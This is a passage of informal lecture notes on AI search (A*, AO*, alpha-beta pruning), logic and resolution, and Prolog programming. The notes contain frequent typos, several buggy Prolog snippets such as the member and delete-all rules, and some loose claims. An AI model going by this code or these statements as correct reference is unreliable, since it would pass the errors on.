*** ''If C(m) has decreased and if m //belongs to// CLOSED, move it to OPEN''
# Loop : Go to step 2

This is similar to dijkstra's algorithm, but also works with -ve costs.
If all the costs are +ve, no state comes back to OPEN from CLOSED. 
If the costs are all the same (say unit cost) then the alogrithm would reduce to BFS.

Branch and Bound can be applied to this, by removing any paths with higher cost when we find a path to the goal with a lower cost. This only works in case of +ve costs. 


!!!Basic Search Alogrithm with explicit space and ost search 
# Iniitalise : Set OPEN = {s},
		   CLOSED = {},       
		   C(s) = 0, ''C* = infinity''
# Fail: If OPEN ={}, then return C*
# Select : ''Select the minimum cost state'', n, from OPEN and save n in CLOSED
# Teminate : If n //belongs to// G ''and C(n) &lt; C*, then ''
                ''Set C* = C(n) and Go To Step 2'' s
# Expand : Generate the successors of n using O 
* ''If (C(n) &lt; C* generate the successors of n''
* For each successor, m:
** if m //does not belong to // [OPEN //U// CLOSED]
*** ''Set C(m) = C(n) + C(n,m)'' and insert m in OPEN 
** if m //belongs to // [OPEN //U// CLOSED]
*** ''Set C(m) = min(C(m), C(n) + C(n,m))''
*** ''If C(m) has decreased and if m //belongs to// CLOSED, move it to OPEN''
# Loop : Go to step 2

!The notion of heurisitcsa
Heuristics use domain specific knowledge to estimate the quality or potential of partial solutions. 

Example: Manhattan distance heuristic for 8-puzzle
* Find the manhattan distance for a number from its current position to the position we want it to be, i.e if 5 resides in the 1st square, then find the manhattan distance from 1st square to 5th square. 
* Computing the sum of manhattan distances for all numbers, gives a lower bound on the number of moves that we need to make

Example: Minimum spanning tree for heuristics
* the cost of minimum spanning tree is less than the cost of optimal tour if all costs are +ve 
* If we represent 
** C~~s~~ - cost of minimum spanning tree
** C* - optimal TSP solution 
* then C~~s~~ &lt; C* &lt; 2C~~s~~, works only in eucledian space, which allows triangular inequality

Example: chess programs


!Search problem definition using heuristics
* given 5-tuple [S,s,O,G,h] where
** S is the set of state
** s is the start state
** O is the set of transition operators
** G is the set of goal state
** ''h()'' is a heuristic funciton estimating the distance to a goal
* Goal is to find a minimum cost sequence of state transistions leading from state start &quot;s&quot; to a goal state. 

!!Alogrithm A*
# Initialise:	Set OPEN = {s}, CLOSED = {}
		g(s) = 0, f(s) = h(s), where
** g(n) - minimum cost path from start state to this state 
** h(n) - heuristic estimate of minimum cost path from current state to goal state
** f(n) - g(n) + h(n)
# Fail: 	If OPEN={}, terminate and fail
# Select:	Select the minimum cost state,n, from OPEN. Save n in CLOSED.
# Terminate:    If n //belongs to// G, terminate with success and return f(n)
# Expand:	For each successor, m, of n
* If m //does not belong to// [OPEN //U// CLOSED]
** Set g(m) = g(n) + C(n,m)
** Set f(m) = g(m) + h(m)
** Insert m in OPEN
* If m //belongs to// [OPEN //U// CLOSED]
** Set g(m) = min {g(m), g(n) + C(n,m)}
** Set f(m) = g(m) + h(m)
* If f(m) has decreasd and m //belongs to// CLOSED, 
** move m to OPEN
# Loop :	Go to Step 2


Every node has to be expanded atleast once, and if we can ensure that each node is expanded only once, then we can ensure that we have linear time algorithm to reach the goal. 

Lets say
{{{
S = { n | f(n) &lt; C* }
}}}
Every alogrithm has to visit these states. So if any alogrithm which expands all these ends and linear, is a guaranteed to give out a aymptotically optimal solution. 
We can ensure that a node is not expanded twice, by ensuring that a node is never moved from CLOSED to OPEN. This works in non-heuristic alogrithm with +ve costs.
Heuristic searches require nodes to added back into OPEN from CLOSED. 

!!admissable heuristic
A heuristic is called admissiable if it alway under-estimates, that is, we always have h(n) &lt;= f*(n), where f*(n) denotes the minimum distance to a goal state from state n. 

If a heuristic over-estimates, then this might cause the algorithm to not expand some nodes whose estimates are high, but there might be some goals underneath that node. 

!!Choosing heuristic function

If we have no idea of the problem or heuristic function, choose a heuristic function which is 0 at all states. 
If we don't have good underestimate, but a tight overestimate then its better to go for branch-and-bound. 
If we dont' have good overestimate, but a tight underestimate then its better to go heuristic based search.

!!Results on A*
* At any time before A* terminates, there exists in OPEN a state n that is on an optimal path from s to a goal state, with f(n) &lt;= f*(s)a
* If there is a path from s to a goal state, A* terminates (even when the state space is infinite)
* Alogrithm A* is admissible, i.e, if there is a path from s to a goal state, A* terminates by finding an optimal path. 
* If A~~1~~ and A~~2~~ are two versions of A^^*^^ such that A~~2~~ is more informed than A~~1~~, then A~~1~~ expands at least as many states as does A~~2~~.
* If we have A~~1~~ and A~~2~~ are two versions of A^^*^^ such that both are good heuristics, but none is more informed than the other, then the best way to use them is to use max {h~~1~~(n), h~~2~~(n)} at every state as heuristic function. 
* If the heuristics are very close to optimal, then we will be expanding fewer states.

!!Monotone Heuristics
* An admissible heuristic function, h(n), is monotonic if for every successor m of n:
** h(n) - h(m) &lt;= c(n,m)
* If the monotone restriction is satisfied, then A* has already found an optimal path to the state it selects for expansion. 
* If the monotone restriction is satisfied, the f-values of the states expanded by A* is non-decreasing. 


!!Pathmax
converts a non-monotonic heuristic to a monotonic one:
* During generation of the successor, m of n we set:
** h'(m) = max { h(m), h(n) - c(n,m)) }

!!Non-Admissible heuristics
Non-admissible heuristics can be used to reduce the number of states that have to be expanded. If a sub-optimal solution is also good enough, then using these heuristics which over-estimate tightly are useful in reducing the number of state required to be expanded. 
If we are fine to get a sub-optimal solution which is not more than 1.4 times the optimal solution, then we can use a heuristic function which does not estimate more than 1.4 times the actual cost. 

!!Iterative Deepening A* (IDA*)
similar to iterative deepening for basic non-heuristic search. 
We will use depth-first search with heuristic based cost measures at states. # Set C = f(s)
# Perform DFBB with cut-off C
** Expand a state, n, only if its f-value is less than or equal to C
** If a goal is selected for expansion then return C and terminate
# Update C to the minimum f-value which exceeded C among states which were examined and Go to Step 2   

During the inital stage we will be expanding to upto a certain stage, from then on we only expand only the ones which are the most likely to be optimal. 
It is asymptotically optimal. 


!Problem reduction search
Planning how best to solve a problem that can be recursively decomposed into sub-problems in multiple ways

Examples: matrix multiplication, tower of hanoi, blocks world, theorem proving

!!AND-OR Graphs
* An OR node represents a choice between possible decompositions
* An AND node represents a given decomposition

Problem definition
* given [G,s,T] where
** G: implicitly specified AND/OR graph
** S: start node of the AND/OR graph
** T: set of terminal nodes
** h(n) heuristic function estimating the cost of solving the sub-problem at n
* the goal is to find a minimum cost solution tree

We can also have heuristic function in AND/OR graphs too.  

!!!!Alogrithm AO*
# Initialise: Set G* = {s}, f(s) = h(s)
***		If s //belongs to// T, label s as SOLVED
# Terminate: If s is SOLVED, then terminate
# Select: Select a non-terminal leaf node n from the marked sub-tree
# Expand: Make explicit the successors of n 
** For each new successor, m:
*** Set f(m) = h(m)
*** If m is terminal, label m SOLVED
# Cost Revision: call cost-&gt;revise(n)
# Loop: Go To Step 2

* Cost revision in AO*
## Create Z = {n}
## If Z = {} return
## Select a node m from Z such that m has no descendants in Z
## if m is an AND node with successors r~~1~~, r~~2~~, ...r~~k~~
***	set f(m) = sum [ f(r~~1~~) + c(m,e~~1~~) ]
***	mark the edge to each successor of m 
***	if each successor is labeled solved, then label m as solved.
## if m is an OR node with successors r~~1~~, r~~2~~, ...r~~k~~
***	set f(m) = min [ f(r~~1~~) + c(m,e~~1~~) ]
***	mark the edge to each successor of m 
***	if each successor is labeled solved, then label m as solved.
## If the cost or label of m has changed, then insert those parents of m into Z for which m is a marked successor.

!!Game Trees
* Game trees are OR trees with 2 types of OR nodes,
* Max nodes represent the choice of my opponent, select the max cost successor
* Min nodes represent my choice, select the min cost successor

''Shallow Cut-off'', In the below figure we can see that A is a min node, which is the opponent move, B is our move, at B we are guaranteed to get more than 14, but that is not useful as at A opponent will only allow us to get 10 form the left node, so there is no need to evaluate C.
{{{
               __ __
              |     | ROOT
	      |__ __|
		/
	       /
	      /
	     /\
	    /  \ A
	    \  /
	     \/
	     /\
	    /  \
	   /	\ __ __
          10     |     | B
		 |__ __|
		   / \
	          /   \
	         /     \
		14     C  
}}}
''Deep Cut-off'', In the below figure, at D we can get only a value of atmost 5, that the value at D &lt;= 5, At Root the right side can produce 10, we will only come down the path of A, if B can produce more than 10, since D can only produce upto 5, D is of no intrest to B, hence ROOT.
{{{
               __ __
              |     | ROOT
	      |__ __|
		/ \
	       /   \ 
	      /     \
	     /\     10
	    /  \ A
	    \  /
	     \/
	      \
	       \
	    	\ __ __
                 |     | B
		 |__ __|
		   / \
	          /   \
	         /     \
                /\      G
             D /  \ 
               \  /
                \/
		/\
               /  \
              /    \
	     5      E
}}}

!!!!Alpha-Beta Pruning
* Alpha Bound of J
** The max current val of all MAX ancestors of J
** Exploration of a min node, J, is stopped when its value equals or falls down below alpha
** In a min node, we update beta
** beta is maintained on min nodes
* Beta Bound of J
** The min current value of all MIN ancestors of J
** Exploration of a max node, J, is stopped when its value equals or exceeds beta
** In a max nove, we update alpha
** alpha is maintained on max nodes
* In both min and max nodes, we return when alpha &gt;= beta

[img[images/alpha.beta.pruning.png]]

!!!!Alpha-Beta Procedure: V(J;alpha,beta)
# If J is a terminal, return V(j) = h(J)
# If J is a max node:
** For each successor J~~k~~ of J in succession:
*** Set alpha = max(alpha, V(J~~k~~; alpha, beta)
*** If alpha &gt;= beta then return beta, else continue
** Return alpha
# If J is a min node:
** For each successor J~~k~~ of J in succession:
*** Set beta = min {beta, V(J~~k~~; alpha, beta)}
*** If alpha &gt;= beta then return alpha, else continue
** Return beta


!Wumpus World
Below is picture of Wumpus world which is a grid. 
* ''PIT''. Grids can have PITs, and if we enter any of the PIT squares we will fall in the pit. All the horizontally and veritcally adjacent squares of the PIT square would have ''Breeze'' in them.
* ''Wumpus''. If we enter a square with a Wumpus we die. A wumpus can exist in the same square as that of PIT. Horizontally and vertiaclly adjacent squares of a wumpus would smell ''stench''. 
* ''Gold'': One of the square in the grid would have gold. The aim of the game is to reach this square. 
* ''Walls'': Some of the sides of squares would have walls, we cannot move through walls
* ''Arrows'': We can have arrows, we can shoot an arrow vertically of horizontally and any Wumpus in that path would get killed. Arrows cannot pass through walls. If a wumpus gets killed it will emit a scream. The agent would have only one arrow. 
* ''Agent'' starts from the bottom-left square of a grid.

!Logic
* Logic is a formal system for describing states of affairs, consisting of:
** syntax: describes how to make sentences, and
** semantincs: describes the relation between the sentences and the state of affairs

* Proof theory - a set of rules for deducing the entailments of a set of sentences

!Propostional logic
Logics of or,and,implies and other stuff

Inferences :
{{{
	a || b,  b              a || b,  ~b || c
	----------              -----------------
	    a                        a || c
}}}
The numerator are the given propositions which are valid, denominator is the one we can derive

* ''valid'' : a proposition is ''valid'', if the value of the proposition is true for all value of inputs. So if a proposition is valid, i.e, true of all combinations of input, then its inverse is false for all combination of inputs, i.e the inverse of ''valid'' proposition is ''unsatisfiable''
* ''satisfiable'' : a proposition is ''satisfiable'', if the value of the proposition is true of atleast one combination of inputs

In general, the inference problem is NP-complete (Cook's theorem)

Horn sentences of the form 
{{{
	F~~1~~ &amp;&amp; F~~2~~ &amp;&amp; .... F~~k~~ =&gt; G
}}}
are polytime procedures

!First-order logic
First-order logic is a very generalised version of logic when compared to propositional logic. In first-order logic variables can take any values, not just binary

Like propostions, first-order logic has predicates.
A predicate is defined as P(x,y,z), the value of P depends on the value of x,y,z
Example:
{{{
	forall x, forall y, forall z,  P(x,y,z)
	forsome x, forall  y, forsome z,  P(x,y,z)
}}}

!!!Elements in first-order logic
* Constan -&gt;     A | 5 | Kolkata | ....
* Variable -&gt; a | x | s | ....
* Predicate -&gt;   Before | HasColor | Raining | ....
* Function -&gt;   Mother | Cosine | Headoflist | ....

Example :
{{{
Everyone loves its mother

	forall x, thereexits y Mother(x,y) &amp;&amp; Loves(x,y)

The samething can be written using functions

	forall x, Loves (x, Mother(x))
}}}

* Sentence -&gt; AtomicSentence 
*** | Sentence Connective Sentence
*** | Quantifier variable, ... Sentence
*** | ~ Sentence | (Sentence)
* AtomicSentence -&gt;
*** Predicate(Term, ...) | Term = Term
* Term -&gt; 
*** Function (Term, ...) | Constant | Variable
* Connective -&gt;         ==&gt; | || | &amp;&amp; | &lt;==&gt;
* Quantifier -&gt;	forall | forsome(thereexists)

!Inference in first-order logic
Inference is propositional logic is easy to define, as the domain of each variable is boolean and beolean satisfiability can be used to solve this. But for first-order logic the domain of the variable can be infiinite, so satisfiability of them is difficult to verify.

!!!Inference Rules
* Universal Elimination
** (for all) x Likes(x, IceCream) with the substitution {x / Einstein} give us Likes(Einstein, IceCream). That is, we know all like icecream, so we can deduce Einstein likes IceCream.
** The substiution has be done by a ground term
* Esistential elimination
** (there exists ) x Likes(x, IceCream), we may infer Likes(Man, IceCream) as long as Man does not appear elsewhere in the knowledge base. Man here is being used as a placeholder to represent x's which like IceCream. 
* Existential INtroduction
** From LIkes(Monalisa, IceCream) we can infer (there exists) x Likes(x, IceCream).

!!!Generalized Modus Ponens
* For atomic sentences p~~i~~, p~~i~~^^'^^, and q, where there is a substitution theta, such that SUBST(theta, p~~i~~^^'^^) = SUBST(theta, p~~i~~), for all i :

{{{
p~~1~~^^'^^,p~~2~~^^'^^,...,p~~n~~^^'^^, (p~~1~~ &amp;&amp; p~~2~~ &amp;&amp; ... &amp;&amp; p~~n~~ =&gt; q)
-------------------------------------------------------------------------------
                           SUBST(theta,q)
}}}

!!!Unification
UNIFY(p,q) = theta, where SUBST(theta,p) = SUBST(theta, q)

Examples:
UNIFY(Knows(Erdos,x), Knows(Erdos, Godel)} = {x/Godel}
UNIFT(Knows(Erdos, x), Knows(y,Godel)} = {x/Godel, y/Erdos}
UNIFY(Knows(Erdos, x), Knows(x,Godel)} = F


!!!Horn logic
* We can convert Horn sentences to a cnonical form and then us egenralized Modus Ponens with unifcation. 
** We skolemize(replace 'there exists', with some unused variable name) existential formula and remove the universal ones
** This gives us a conjunction of clauses, that are  inserted in the knowledge base.
** Modus Ponens help us in ingerring new clauses.
* Forward and backward chaining. 

!!!Modus Ponenes - Completeness
* Reasoning with Modus Ponenes is incomplete
* Examples:
{{{
	(far all)x P(x) =&gt; Q(x)		(for all)x !P(x) =&gt; R(x)
	(for all)x Q(x) =&gt; S(x) 	(for all)x R(x) =&gt; S(x)
}}}
* We should be able to conclude S(A)
* The problem is that (for all)x !P(x) =&gt; R(x) cannot be converted to Horn form, and thus cannot be used by Modus Ponens

!!!Godel's Compeleteness Theorem
* For first-order logic, any sentence hat is entailed by another set of sentences can be proved from that set
* Entailment in first-order logic is semi-decidable, that is, we can show that sentences followfrom premisses if they do, but we cannot always show if they do not. 

!!!Resolution
Given
* p~~1~~ &amp;&amp; p~~2~~ ... &amp;&amp; p~~n1~~ =&gt; r~~1~~ || r~~2~~ .... || r~~n2~~
* s~~1~~ &amp;&amp; s~~2~~ ... &amp;&amp; s~~n3~~ =&gt; q~~1~~ || q~~2~~ .... || q~~n4~~
* Unify(p~~j~~, q~~k~~) = theta

then
* applying A =&gt; B  ==== !A || B, we get
** !p~~1~~ || !p~~2~~ || ... || !p~~j~~ ... || !p~~n1~~ || r~~1~~ || .... || r~~n2~~
* similarly for the second one, we get
** !s~~1~~ || !s~~2~~ || ... || !s~~n3~~ || q~~1~~ || ...q~~k~~ || ... || q~~n4~~
* Applying Unify(p~~j~~, q~~k~~), in the || of the above 2 expansions, 
** we see that (!p~~j~~ || q~~k~~) will always be true, because atleast one of them is true always.
* Now we have, by applying &amp;&amp; on both the expansions, !p~~j~~ in the first term is complement of q~~k~~, so either of the first or second expansions is always true	
** !p~~1~~ || !p~~2~~ || ... || !p~~j-1~~ || !p~~j+1~~ || ... || !p~~n1~~ || r~~1~~ || .... || r~~n2~~ || !s~~1~~ || !s~~2~~ || ... || !s~~j~~ ... || !s~~n3~~ || q~~1~~ || ..|| q~~k-1~~ || q~~k+1~~ || .. || q~~n4~~
* By applying reverse of the first rule on the above expansion we get
** p~~1~~ &amp;&amp; p~~j-1~~ &amp;&amp; p~~j+1~~ &amp;&amp; ... p~~n1~~ &amp;&amp; s~~1~~ &amp;&amp; .... s~~n3 =&gt; r~~1~~ &amp;&amp; ... r~~n2!! &amp;&amp; q~~1~~ &amp;&amp; ... q~~k-1~~ &amp;&amp; q~~k+1~~ &amp;&amp; ... &amp;&amp; q~~n4~~

!!!Conversion to Normal Form
* A formula is said to eb in clause form if it is of the form: 
*** (for all)x~~1~~, (for all)x~~2~~ ... (for all)x~~n~~ [ C~~1~~ &amp;&amp; C~~2~~ .... &amp;&amp; C~~k~~]
* All fist-order logic formulas can be converted to clause form
* Example: Given
*** (for all)x {P(x) =&gt; (for some)z { !(for all)y [ q(x,y) =&gt; p(f(x~~1~~))] &amp;&amp; (for all)y [q(x,y) =&gt; p(x)]}}

** Take the existential closure and eliminate redundant qunatifiers, This introduces (for some)x and eliminates (for some)z, where for x~~1~~, we have the first (for some)x, and since z is not  being used, we eliminate z
*** (for some)x~~1~~ (for all)x {p(x) =&gt; { !(for all)y [ q(x,y) =&gt; p(f(x~~1~~))] &amp;&amp; (for all)y [q(x,y) =&gt; p(x)]}}

** Rename any variable that is qunatified more than once, y has been qunatified twice, so, the y in the first q is not the same y in the second q, both are separately qunatified, 
*** (for some)x~~1~~ (for all)x {p(x) =&gt; { !(for all)y [ q(x,y) =&gt; p(f(x~~1~~))] &amp;&amp; (for all)z [q(x,z) =&gt; p(x)]}}

** Eliminate implication
*** (for some)x~~1~~ (for all)x {!p(x) ||  { !(for all)y [ !q(x,y) || p(f(x~~1~~))] &amp;&amp; (for all)z [!q(x,z) || p(x)]}}

** Move negation inwards
*** (for some)x~~1~~ (for all)x {!p(x) ||  { (for some)y [ q(x,y) &amp;&amp; !p(f(x~~1~~))] &amp;&amp; (for all)z [!q(x,z) || p(x)]}}

** Push the qunatifiers to the right
*** (for some)x~~1~~ (for all)x {!p(x) ||  { [(for some)y q(x,y) &amp;&amp; !p(f(x~~1~~))] &amp;&amp; [(for all)z !q(x,z) || p(x)]}}

** Eliminate existential qunatifiers (skolemization)
*** Pick out the leftmost (for some)y B(y) and replace it by B(f(x~~i1~~, x~~i2~~, ...,x~~in~~)), where:
#### x~~i1~~, x~~i2~~, ..., x~~in~~ are all the distinct free variables of (for some)y B(y) that are universally quntified to the left of (for some)y B(y), and
#### F is an n-ary function constant which does not occur already: Example:
*****(for all)x~~1~~ (for all)x~~2~~ (for all)x~~3~~ (for some)y B(y)
can be written as
B(f(x~~1~~, x~~2~~, x~~3~~)
*** After applying skolemization
****(for all)x {!p(x) ||  { [q(x,g(x)) &amp;&amp; !p(f(a))] &amp;&amp; [(for all)z !q(x,z) || p(x)]}}

** Move all universal qunatifiers to the left
*** (for all)x (for all)z {!p(x) ||  { [q(x,g(x)) &amp;&amp; !p(f(a))] &amp;&amp; [!q(x,z) || p(x)]}}

** Distribute &amp;&amp; over ||
*** (for all)x (for all)z {[!p(x) || q(x,g(x))] &amp;&amp; [!p(x) || !p(f(a))] &amp;&amp; [!p(x) || !q(x,z) || p(x)]}}

** Simplify
*** (for all)x {!p(x) || [ q(x,g(x)) &amp;&amp; !p(f(a))] }

!Resolution Refutation proofs
* Convert the set of rules and facts into clause form(conjuction of clauses)
* Insert the negation of the goal as another clause, and should not be unsatisfiable
* Use resolution to deduce a refutation
* If a refuatation is obtained, then the goal can be deduced from the set of facts and rules.

!!!Resolution in clause form
* If Unify(z~~j~~, !q~~k~~) = theta, then
z~~1~~ || ... || z~~m~~,       q~~1~~ || ... || q~~n~~
-------------------------------------------------------
SUBST(theta, z~~1~~ || ... || z~~j-1~~ || z~~j+1~~ || ... || z~~m~~
          || q~~1~~ || ... || q~~k-1~~ || q~~k+1~~ || ... || q~~n~~)

* Example:
** Harry, Ron and Draco are students of Hogwarts school of wizards
** Every student is either wicked or is a good Quidditch player, or both
** No Quidditch player likes rain and all wicked students like potions
** Draco dislikes whatever Harry likes and likes whatever Harry disklikes
** Draco likes rain and potions
** Is there a student who is good in Quidditch but not in potions.
** Clauses are
{{{
C1 - Sutdent(Harry) 
C2 - Student(Ron) 
C3 - Student(Draco)
(for all)x, Student(x) =&gt; Wicked(x) || Quidditch(x)
C4 - !Student(x) || Wicked(x) || Quidditch(x)
(for all)x Quidditch(x) =&gt; !Likes(x,Rain)
(for all)x Wicked(x) =&gt; Likes(x, Potions)
C5 - !Quidditch(x) || !Likes(x,Rain)
C6 - !Wicked(x) || Likes(x, Potions)
(for all)x Likes(Harry, x) &lt;=&gt; !Likes(Draco,x)
C7 - !Likes(Harry,x) || !Likes(Draco,x)
C8 - Likes(Harry,x) || Likes(Draco,x)
C9 - Likes(Draco, Rain)
C10 - Likes(Draco, Potions)
}}}
** Goal is
{{{
G  - (for some)x Quidditch(x) &amp;&amp; !Likes(x,Potions)
!G - (for all)x !Quidditch(x) || Likes(x,Potions)
We will insert !G as C11
}}}
** Deduction
{{{
From C10 and C7, we get
C12 - !Likes(Harry, Potions)
From C12 and C11(!G), we get
C13 - !Quidditch(Harry)
From C12 and C6
C14 - !Wicked(Harry)
From C1 and C4
C15 - Wicked(Harry) || Quidditch(Harry)
From C15 and C14
C16 - Quidditch(Harry)
But C16 and C13 are contradictory
}}}

!!!Resolution strategies
* Unit Resolution
** Every resolution step must involve a unit clause
** Leads to a good speedup
** Incomplete
** Complete for Horn knowledge bases
* Input Resolution
** Every resolution step must involve a input sentence (from the query or the KB).
** In Horn KBs, Modus Ponens is a kind of input resolution strategy.
** Incomplete
** Complete for Horn knowledge bases
* Linear Resolution
** Slight generalization of input resolution
** Allows P and Q to be resolved together either if P is in the original KB, or if P is an ancestor of Q in the proof tree
** Linear resolution is complete

!Logic Programming: Prolog
* The notion of instantiation
{{{
likes(harry, school)
likes(ron, broom)
likes(harry,X) :- likes(ron,X)        ( which is &lt;= instead of =&gt; )
}}}
* Consider the following goals
{{{
? - Likes(harry, broom)
Prolog will translate goal into likes(harry,X) :- likes(ron,X)
likes(ron,broom)
}}}
{{{
? - Likes(harry, Y)
Prolog will first unify Likes(harry,Y) with (harry, school) and print Y = school
Prolog will then continue to unify the goal with likes(harry,X) :- likes(ron,X) which will continue will continue to be applying likes(ron,broom) and print Y = broom
}}}
{{{
? - likes(Z,school)
first rule will be applied, and print Z = harry
will continue and apply rule 2 which fails
will continue and apply rule 3, but can't go further so would not print ron
}}}
{{{
? - likes(Z,Y)
then first rule would print (harry, school)
then second rule would print (ron, broom)
then third rule would be expanded further and print (harry, broom)
}}}
* The clauses will be attempted in the order specified
* Another Example
{{{
offspring(Y,X) :- parent(X,Y)
mother(X,Y) :- parent(X,Y), female(X)
grandparent(X,Z) :- parent(X,Y), parent(Y,Z)
sister(X,Y) :- parent(Z,X), parent(Z,Y), female(X), different(X,Y)
predecessor(X,Z) :- parent(X,Z)
predecessor(X,Z) :- parent(X,Y), predecessor(Y,Z).
}}}
* The order of the rules is important
* Lists can be written as
{{{
        [ item1, item2, ... ]
or	[ Head | Tail ]
or	[ Item1, Item2, ... | Others ]
[a, b, c] = [a | [b,c]] = [a,b |[c]] = [a,b,c|[]]
}}}
* Items can be lists as well
{{{
[[a,b],c,[d,[e,f]]]
Head of the list is [a,b]
}}}
* Membership and Concatenation
{{{
member(X, [X, Tail])
member(X, [Head, Tail] ) :- member(X, Tail).
conc([], L, L).
conc([X|L1], L2, [X|L3]) :- conc(L1, L2, L3)
? - conc([a], [b], [a,b]) will return true
? - conc([a], Z, [a,b]), prolog would return Z = [b]
? - conc([a], [b], Z), prolog would return Z = [a,b]

Example processing:
? - conc([a,b], [c,d], [a,b,c,d]) 
In the first step it will try to match with the first rule, but failes since the first list should be empty
In the second step X = a L1=[b], L2 = [c,d], L3 = [b,c,d] will result in requirement of conc([b], [c,d], [b,c,d]) ( as in RHS), which is the new sub-goal
To match the sub-goal it will try to match with the first rule, which will fail, and then try the second rule X = b L1 = [], L2 = [c,d], L3 =[c,d], which is the new sub-goal
This new sub-goal with match the first rule
}}}
* Adding in front:
{{{
add(X,L,[X|L])
}}}
* Deletion of element : del(X, L1, L2)
{{{
del(X, [], [])
del(X, [X|Tail], Tail)
del(X, [Y|Tail], [Y|Tail1]) :- del(X, Tail, Tail1)
}}}
* Deletion of all occureneces of element : del (X, L1, L2)
{{{
del(X, [], [])
del(X, [X|Tail], Tail) :- del(X, Tail], Tail)
del(X, [Y|Tail], [Y|Tail1]) :- del(X, Tail, Tail1)
}}}
* Sublist
{{{
sublist(S,L) :- conc(L1, L2, L), conc(S, L3, L2)
Example:
? - sublist([a,b], [d,a,b,c])
L1 = [d] L2 = [a,b,c] L3 = [c]
}}}
* Permutation : permuation(L,P), P is a permutation of L
{{{
permuation([], [])
permutation([X|L],P) :- permutation(L,L1) insert(X,L1,P)
}}}
** Example:
*** ? - permutation ([a.b,c,d], [d,c,a,b])
*** X = a L = [b,c,d] L1 
*** sub-goals are permutation([b,c,d],L1), insert(a,L1,[d,c,a,b])
*** Solving sub-goal permutation([b,c,d],L1)
**** X = b L^^'^^=[c,d] L1^^'^^
*** sub-goals generated are permutation([c,d],L1^^'^^), insert(b,L1^^'^^,L1)
*** Solving sub-goal permutation([c,d],L1^^'^^)
**** X = c L^^' '^^=[d] L1^^' '^^
*** sub-goals generaetd are permutation([d],L1^^' '^^), insert(c,L1^^' '^^,L1^^'^^)
*** Solving sub-goal permutation([d],L1^^' '^^)
**** X = d L^^' ' '^^^=[] L1^^' ' '^^
*** sub-goals generated are permutation([d],L1^^' ' '^^), insert(d,L1^^' ' '^^,L1^^' '^^)
*** Solving sub-goal permutation([],L1^^' ' '^^)
**** L1^^' ' '^^=[]
*** Solving sub-goal permutation(d,[],L1^^' '^^)
**** L1^^' '^^=[d]
*** Solving sub-goal insert(c,[d],L1^^'^^)
**** L1^^'^^=[c,d] L1^^'^^=[d,c]
*** Solving sub-goal insert(b,[c,d],L1)
**** L1=[b,c,d] L1=[c,b,d] L1=[c,d,b]
*** Solving sub-goal insert(a,[b,c,d],[d,c,a,b]) is not true
*** Solving sub-goal insert(a,[c,b,d],[d,c,a,b]) is not true
*** Solving sub-goal insert(a,[c,d,b],[d,c,a,b]) is not true
*** Solving sub-goal insert(b,[d,c],L1)
**** L1=[b,d,c] L1=[d,b,c] L1=[d,c,b]
*** Solving sub-goal insert(a,[b,d,c],[d,c,a,b]) is not true
*** Solving sub-goal insert(a,[d,b,c],[d,c,a,b]) is not true
*** Solving sub-goal insert(a,[d,c,b],[d,c,a,b]) is true
** Example:
*** ? - permutation([a,b,c,d],X) -- would generate all premutations of [a,b,c,d]
** Another way of writing permutations are
*** permutation([],[])
*** permutation(L,[X|P]) :- del(X,L,L1), permutation(L1,P)

* Arthimetic and Logical operators
** We have +,-,*,/,mod
*** ''is'' operator forces evaluation
*** ? - X is 3/2 - will be answered by X=1.5
** We have &gt;,&lt;,&gt;=,&lt;=,=:=,=\=
***Examples:
{{{
GCD:
gcd(X,X,X)
gcd(X,Y,D) :- X &lt; Y, Y1 is Y - X, gcd(X,Y1,D)

Length of a list:
length([],0)
length([_|Tail],N) :- length(Tail,N1), N is N1 + 1
}}}
* Example of Control Flow
{{{
r(a)
s(b,c)
m(b)
n(a)
q(X) :- m(X)
Q(X) :- n(X)
p(X,Y) :- q(X), r(Y)
p(x,Y) :- r(X), s(X,Y)
? - p(a,Y)
                                     p(a,Y)
                                     /    \
                                 /            \
                             /                    \ 
               Y = a     /                            \
                   q(a) &amp; r(Y)                    r(a) &amp; s(a,Y)    (Fail)
                    /    \                             /\  
                 /          \                       /      \
              /                \                 /            \
            q(a)               r(Y)            r(a)          s(a,Y)
            / \                  |              |              | 
           /   \                 |              |              |
          /     \                |              |              |
        m(a)   n(a)            r(a)           match          Fail
         |      |
         |      |
       Fail   match
}}}
* Exercising control over flow
** 8-Queens problem
*** permutation([1,2,3,4,5,6,7,8], Queens)  ( the numbers represent the rows, their position in the list represents col)
*** safe(Queens)
{{{
permutation([[],[])
permutation([Head|Tail], Permlist) :- permutation(Tail,PermTail), del(Head,Permlist,PermTail).

safe([])
safe([Queen|Other]):- safe(Others), noattack(Queen,Others,1)

noattack(_,[],_)
noattack(Y,[Y1|Ylist],Xdist) :- Y1 - Y =\= Xdist, Y - Y1 =\= Xdist,
                                Dist1 is Xdist + 1, noattacks(Y,Ylist,Dist1)
}}}
* CUPS: for controlling backtracking
** ''!'' is called ''cut'' character, which allows processing of further backtracking to be disabled for the variable.
** C :- P,Q,R,!,S,T,U
** C :- V
** A :- B,C,D
** ? - A
* Backtraking within the goal list P,Q,P
* As sson as the cut is reqched 
** All alternative of P,Q,R are suppressed
** The claure C:- V will also be discarded
** Backtracking possible within S,T,U
** No effect with A:- B,C,D, that is, backtracking within B,C,D remains active
* Example:
{{{
Maximum of two numbers, 
If X &gt;= Y then max = X, otherwise max = Y
max(X,Y,X) :- X &gt;= Y, !
max(X,Y,Y)
}}}
{{{
ADding an leement in to a list without duplication
add(X,L,L) :- member(X,L),!
add(X,L,[X|L])
}}}
* Negation as failure
** Example
{{{
Frodo likes all jewellery except rings
likes(frodo,X) :- ring(X),!,Fail
likes(frodo,X) :- jewellery(X)
}}}
* The ''different'' predicat:
{{{
different(X,X) :- !,fail
different(X,Y). 
}}}
* Quicksort
{{{
quicksort([],[])
quicksort([X|Tail], sorted):- 
           split(X,Tail,Small,Big)
	   quicksort(Small,SortedSmall)
	   quicksort(Big,SortedBig)
	   conc(SortedSmall,[X|SortedBig],Sorted)
split(X,[],[],[])
split(X,[Y|Tail],[Y|Small],Big) :- gt(X,Y),!,split(X,Tail,Small,Big)
split(X,[Y|Tail],Small,[Y|Big]) :- split(X,Tail,Small,Big)
}}}

!Constraint Logic programming
* Example
{{{
fat(X)     - X &gt; 60, X &lt; 80
obese(Y)   - Y &gt; 70, Y &lt; 100
proper(Z)  - obese(Z),!,Fail
proper(Z)  - fat(Z)
? - proper(65) - yes ( by 2nd rule)
? - proper(75) - no (Failed)
? - proper(X)  - The first rule will tell X &lt; 70 and X &gt; 100, then the second rule which defines the range X &gt; 60 and X &lt; 70. These conditional value which define the range are maintained in the constraint stack.
}}}

